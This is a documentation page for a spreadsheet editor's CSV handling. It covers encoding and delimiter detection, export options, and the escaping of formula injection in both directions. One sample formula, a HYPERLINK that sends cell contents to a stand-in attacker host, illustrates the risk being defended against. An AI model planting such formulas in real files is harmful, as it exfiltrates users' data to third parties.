---
title: CSV files
description: How CSV, TSV and text files open as workbooks, how sheets are written as CSV, and how formula injection is prevented both ways.
sidebar:
  order: 8
---

`.csv`, `.tsv` and `.txt` files open as a workbook of one sheet, named after the file, read the way Excel reads them in the user's locale. Saving writes `.xlsx` (`prices.csv` saves as `prices.xlsx`), and schemas and checks work as for any workbook.

## Opening

- **Encoding**: from a byte order mark (UTF-8, or UTF-16 either way round); without one, UTF-8 if the file is valid UTF-8, and Windows-1252 otherwise.
- **Delimiter**: the one a `sep=;` first line names; a tab for `.tsv`; otherwise whichever of tab, semicolon and comma splits the first hundred records most consistently, the locale's list separator winning a tie.
- **Fields** follow RFC 4180: quoted fields can hold delimiters, doubled quotes and line breaks.
- **Values** are read as if typed: numbers, percentages, currencies, dates, times, TRUE and FALSE, with the number format they imply. As in Excel, `007` becomes 7 and digits past the fifteenth are lost.
- **Nothing becomes a formula.** A field starting with `=` stays text, as do fields starting with `+`, `-` or `@` that aren't numbers. A CSV file is data from elsewhere, and cells that run when it's opened are a known way to attack people.

`features: { csv: false }` stops the Open button and dropping from taking CSV files; `open()` still does.

## Writing

The toolbar's CSV button, `downloadCsv()` and `getCsv()` write the sheet shown, as Excel's "CSV UTF-8" does: each cell as its number format shows it, formulas as their results, from A1 to the last cell with a value, quoted where needed, with CRLF line ends. The download has a UTF-8 byte order mark; `getCsv` returns the text without one.

The delimiter is the locale's list separator, as Excel's is: a comma, or a semicolon where decimals are written with a comma. Set `delimiter` (`','`, `';'` or `'\t'`) per call, or for the button with the `csvExport` option. Downloading CSV is an export, not a save.

## Formulas in CSV files

A CSV file holds no formulas, but spreadsheet apps run any value that looks like one when they open the file. If a sheet's text came from someone else, a CSV made from it could carry `=HYPERLINK("https://attacker.example/?"&A1, "Details")`, which sends other cells to that site when clicked.

So the CSV the editor writes puts an apostrophe before every value that starts with `=`, `+`, `-`, `@`, a tab or a carriage return (or their full-width forms), as OWASP recommends. Numbers such as `-5` hold nothing to run and are left alone. A host handing the CSV to another program rather than to people can turn this off with `escapeFormulas: false`.
